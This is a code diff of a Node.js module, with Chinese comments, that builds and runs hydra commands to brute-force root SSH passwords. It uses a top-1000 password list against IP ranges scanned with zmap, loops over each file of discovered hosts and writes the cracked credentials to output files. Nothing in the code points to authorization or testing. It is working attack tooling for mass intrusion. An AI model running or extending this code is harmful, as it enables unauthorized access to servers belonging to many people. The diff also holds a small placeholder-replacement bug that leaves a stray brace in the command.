@@ -2,42 +2,56 @@ const fs = require("fs");
 const util = require('util');
 const exec = util.promisify(require('child_process').exec);
 
-class SSH{
+const Base = require("./base");
+
+class SSH extends Base{
 	/*
-		*	
-		*	
+		*	arg1：结果输出文件
+		*	arg2：zmap扫描ip的范围
 	*/
-	constructor(out_file){
-		super(`${__dirname}/../dict/taiguo_ip.txt`,22)
-		this.out_file = out_file;//__dirname + "/../runtime/user-pass.txt"
-		this.brute_command = `hydra -o ${this.out_file} -l root -P ${__dirname}/../dict/top1000.txt -M ${__dirname}/../runtime/ip_${this.port}.txt ssh`;
+	constructor(ip_range_file){
+		super(ip_range_file,22);
 
-		this.ip_list = new Set();
+		this.ip_range_file = ip_range_file;
+		//this.out_file = out_file;//__dirname + "/../runtime/user-pass.txt"
 
+		this.brute_command = `hydra -o {out_file} -l root -P ${__dirname}/../dict/top1000.txt -M {ip_file} ssh`;
 	}
 
 	run(){
-		
+
 	}
 
-	async getIpList(){
+	async bruteIpFromFiles(){
 		let all_ips = new Array();
-		let files = fs.readdirSync(__dirname + "/../runtime/available-ip");
-		for(let file in files){
-			let ips = fs.readFileSync(file);
-			let ip_array = ips.split("\n");
-			all_ips = all_ips.concat(ip_array);
+		let base_path = __dirname + "/../runtime/available-ip/";
+		let files = fs.readdirSync(base_path);
+		let out_base_path = __dirname + "/../runtime/user-pass/"
+
+		for(let file of files){
+			let out_file_name = `user_pass_${file}`
+			let cmd = this.brute_command.replace("{out_file}",`${out_base_path}${out_file_name}`).replace("{ip_file",`${base_path}${file}`);
+			await exec(cmd);
+			this.log.info("run cmd " + cmd);
+			// let ips = fs.readFileSync(base_path + file);
+			// let ip_array = ips.toString().split("\n");
+			// all_ips = all_ips.concat(ip_array);
 		}
-		this.ip_list = new Set(all_ips);
-		for(let ip of ip_list){
-			fs.writeFileSync(__dirname + `/../runtime/ip_${this.port}.txt`,ip,{flag:"a"});
-		}
-		this.log.info("获取ip列表完成");
+		// let ip_set = new Set(all_ips);
+		// for(let ip of ip_set){
+		// 	fs.writeFileSync(__dirname + `/../runtime/ip_${this.port}.txt`,ip + "\n",{flag:"a"});
+		// }
+		// this.log.info("获取ip列表完成");
 		return true;
 	}
 
-	async bruteIp(){
-		await exec(this.brute_command)
-	}
+	// async bruteIp(){
+	// 	await exec(this.brute_command);
+	// }
+
+
 
 }
+
+module.exports = SSH;
+
